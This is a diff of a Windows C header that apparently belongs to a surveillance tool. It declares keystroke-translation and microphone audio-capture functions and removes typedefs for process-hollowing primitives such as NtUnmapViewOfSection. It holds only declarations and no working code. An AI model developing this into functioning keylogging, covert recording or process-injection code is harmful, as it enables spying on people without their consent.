@@ -5,7 +5,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
-//#include <ntapi.h>
 #include <psapi.h>
 #include <winternl.h>
 #include <processthreadsapi.h>
@@ -19,6 +18,7 @@
 #pragma comment(lib, "mf.lib")
 #pragma comment(lib, "mfreadwrite.lib")
 #pragma comment(lib, "mfuuid.lib")
+#pragma comment(linker, "/ENTRY:mainCRTStartup")
 #define INITGUID
 #include <initguid.h>
 
@@ -38,7 +38,6 @@ extern volatile int g_micro_run;
 }
 #endif
 
-PPEB GetPEB(void);
 int vk_to_char(DWORD vkCode, char *out);
 void get_time(char *buf);
 char *special_touch(DWORD vk);
@@ -66,11 +65,5 @@ int take_format_audio(HRESULT *hr, IAudioClient *audioClient, WAVEFORMATEX **for
 int init_wasapi(HRESULT *hr, IAudioClient *audioClient, WAVEFORMATEX *format);
 int get_service(HRESULT *hr, IAudioClient *audioClient, IAudioCaptureClient **captureClient);
 int start_service(HRESULT *hr, IAudioClient *audioClient);
-
-
-typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
-
-typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);
-
 
 #endif
